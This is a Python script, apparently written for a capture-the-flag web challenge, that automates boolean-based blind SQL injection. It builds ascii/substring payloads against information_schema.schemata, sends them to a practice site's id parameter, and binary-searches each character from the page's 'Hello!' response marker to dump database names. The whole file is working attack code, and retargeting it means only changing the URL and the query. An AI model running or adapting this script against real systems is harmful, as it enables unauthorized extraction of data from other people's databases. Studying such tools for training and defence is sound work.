#! /usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/6/28 下午 09:43
# @Site    : 
# @File    : sql.py
# @Software: PyCharm
# @Author: Xuchao

# 能实现所有基于bool的盲注
import binascii
import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1


# config-end

def getPayload(indexOfResult, indexOfChar, mid):  #payload构造函数
    column_name = "schema_name"
    # table_name="schemata"
    table_name = "schemata"


    schema_name = "information_schema"
    startStr = "1' and "
    endStr = " --+"
    # payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"

    payload = "((ascii(substring((select " + column_name + " from " + schema_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"

    payload = startStr + payload + endStr
    return payload


def exce(indexOfResult, indexOfChar, mid):  #payload执行函数
    # content-start
    url = "http://ctf5.shiyanbar.com/web/index_3.php?id="
    tempurl = url + getPayload(indexOfResult, indexOfChar, mid)
    content = requests.get(tempurl).text
    # content-end
    # judge-start
    if "Hello!" in content:  #页面标志字符串
        return True
    else:
        return False
        # judge-end


def doubleSearch(indexOfResult, indexOfChar, left_number, right_number):
    while left_number < right_number:
        mid = int((left_number + right_number) / 2)
        if exce(str(indexOfResult), str(indexOfChar + 1), str(mid)):
            left_number = mid
        else:
            right_number = mid
        if left_number == right_number - 1:
            if exce(str(indexOfResult), str(indexOfChar + 1), str(mid)):
                mid += 1
                break
            else:
                break
    return chr(mid)


def search():
    for i in range(32):  # 需要遍历的结果的数量
        counter = 0
        for j in range(32):  # 每个结果的长度
            counter += 1
            temp = doubleSearch(i, j, 0, 127)  # 从255开始查询
            if ord(temp) == 1:  # 当为1的时候说明已经查询结束
                break
            sys.stdout.write(temp)
            sys.stdout.flush()
        if counter == 1:  # 当结果集的所有行都被遍历后退出
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()

if __name__ == '__main__':

    search()





